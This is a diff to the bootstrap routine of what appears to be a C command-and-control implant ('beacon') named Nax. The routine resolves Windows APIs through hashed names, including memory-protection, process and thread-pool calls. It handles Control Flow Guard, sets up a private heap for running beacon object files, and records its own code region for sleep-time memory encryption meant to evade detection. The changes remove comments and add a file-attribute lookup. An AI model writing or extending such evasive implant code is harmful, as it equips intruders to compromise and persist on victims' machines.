@@ -147,7 +147,6 @@ FUNC VOID NaxGatherSysInfo( PNAX_INSTANCE Nax, PNAX_SYSINFO info ) {
 /* ========= [ instance bootstrap ] ========= */
 
 FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
-    /* - resolve ntdll - */
     HMODULE hNtdll = NaxGetModule( H_NTDLL_DLL );
     if ( ! hNtdll ) return NULL;
 
@@ -155,21 +154,18 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
     if ( ! pAlloc ) return NULL;
     __typeof__( RtlAllocateHeap )* fnRtlAllocateHeap = (__typeof__( RtlAllocateHeap )*)pAlloc;
 
-    /* - allocate instance - */
     HANDLE        heap = NaxGetProcessHeap();
     PNAX_INSTANCE Nax  = (PNAX_INSTANCE)fnRtlAllocateHeap( heap, 0, sizeof( NAX_INSTANCE ) );
     if ( ! Nax ) return NULL;
     MmZero( Nax, sizeof( NAX_INSTANCE ) );
     Nax->Magic                   = NAX_INSTANCE_MAGIC;
 
-    /* - ntdll: heap + debug - */
     Nax->Heap                    = heap;
     Nax->Ntdll.Handle            = hNtdll;
     Nax->Ntdll.RtlAllocateHeap  = (PVOID)pAlloc;
     Nax->Ntdll.RtlFreeHeap      = (PVOID)NaxGetProc( hNtdll, H_RTLFREEHEAP );
     Nax->Ntdll.DbgPrint         = (PVOID)NaxGetProc( hNtdll, H_DBGPRINT );
 
-    /* - resolve remaining ntdll - */
     Nax->Ntdll.RtlExitUserThread         = (PVOID)NaxGetProc( hNtdll, H_RTLEXITUSERTHREAD );
     Nax->Ntdll.NtAllocateVirtualMemory   = (PVOID)NaxGetProc( hNtdll, H_NTALLOCATEVIRTUALMEMORY );
     Nax->Ntdll.NtProtectVirtualMemory    = (PVOID)NaxGetProc( hNtdll, H_NTPROTECTVIRTUALMEMORY );
@@ -187,7 +183,6 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
     Nax->Ntdll.NtOpenProcess             = (PVOID)NaxGetProc( hNtdll, H_NTOPENPROCESS );
     Nax->Ntdll.NtTerminateProcess        = (PVOID)NaxGetProc( hNtdll, H_NTTERMINATEPROCESS );
 
-    /* thread pool + critical section */
     Nax->Ntdll.TpAllocWork                    = (PVOID)NaxGetProc( hNtdll, H_TPALLOCWORK );
     Nax->Ntdll.TpPostWork                     = (PVOID)NaxGetProc( hNtdll, H_TPPOSTWORK );
     Nax->Ntdll.TpReleaseWork                  = (PVOID)NaxGetProc( hNtdll, H_TPRELEASEWORK );
@@ -201,11 +196,9 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
 
     NaxDbgx( Nax, "bootstrap: heap=%p Nax=%p", (PVOID)heap, (PVOID)Nax );
 
-    /* - populate config from compile-time constants - */
     NaxInitConfig( Nax );
     NaxDbgx( Nax, "config: sleep=%u jitter=%u", Nax->Config.SleepMs, (UINT32)Nax->Config.JitterPct );
 
-    /* - resolve kernel32 - */
     HMODULE hK32 = NaxGetModule( H_KERNEL32_DLL );
     NaxDbgx( Nax, "kernel32: %p", hK32 );
     if ( ! hK32 ) {
@@ -260,7 +253,6 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
     Nax->Kernel32.GetACP                          = (PVOID)NaxGetProc( hK32, H_GETACP );
     Nax->Kernel32.GetOEMCP                        = (PVOID)NaxGetProc( hK32, H_GETOEMCP );
 
-    /* threading */
     Nax->Kernel32.CreateThread               = (PVOID)NaxGetProc( hK32, H_CREATETHREAD );
     Nax->Kernel32.TerminateThread            = (PVOID)NaxGetProc( hK32, H_TERMINATETHREAD );
     Nax->Kernel32.GetTickCount64             = (PVOID)NaxGetProc( hK32, H_GETTICKCOUNT64 );
@@ -268,26 +260,15 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
     Nax->Kernel32.DuplicateHandle            = (PVOID)NaxGetProc( hK32, H_DUPLICATEHANDLE );
     Nax->Kernel32.GetCurrentProcess          = (PVOID)NaxGetProc( hK32, H_GETCURRENTPROCESS );
 
-    /* CFG */
     Nax->Kernel32.GetProcessMitigationPolicy = (PVOID)NaxGetProc( hK32, H_GETPROCESSMITIGATIONPOLICY );
+    Nax->Kernel32.SetFileAttributesA         = (PVOID)NaxGetProc( hK32, H_SETFILEATTRIBUTESA );
 
-    /* - create a PRIVATE heap for beacon allocations ---------------------
-     * BOF code calls HeapAlloc(GetProcessHeap(), ...) expecting a clean heap.
-     * If our beacon uses GetProcessHeap() too, we dirty it with hundreds of
-     * allocations (heartbeat buffers, BofCtx output, etc.), causing the BOF's
-     * first HeapAlloc to return a chunk whose low 2 bytes can exceed the BOF's
-     * output buffer size → signed underflow → rep movsb crash (whoami BOF).
-     *
-     * With a private heap: beacon allocations come from Nax->Heap (private),
-     * BOF's GetProcessHeap() allocations come from the process default heap
-     * (relatively clean → address low 2 bytes safely below 0x2000). */
     if ( Nax->Kernel32.HeapCreate ) {
         HANDLE priv = Nax->Kernel32.HeapCreate( 0, 0, 0 );
         if ( priv ) Nax->Heap = priv;
     }
     NaxDbgx( Nax, "beacon private heap: %p", Nax->Heap );
 
-    /* - kernelbase (CFG) - */
     HMODULE hKB = NaxGetModule( H_KERNELBASE_DLL );
     if ( hKB )
         Nax->Kernelbase.SetProcessValidCallTargets = (PVOID)NaxGetProc( hKB, H_SETPROCESSVALIDCALLTARGETS );
@@ -404,7 +385,6 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
     }
     NaxDbgx( Nax, "user32=%p gdi32=%p", hUser32, hGdi32 );
 
-    /* Record beacon .text region for sleepmask encryption */
     if ( Nax->Ntdll.NtQueryVirtualMemory ) {
         MEMORY_BASIC_INFORMATION mbi;
         MmZero( &mbi, sizeof( mbi ) );
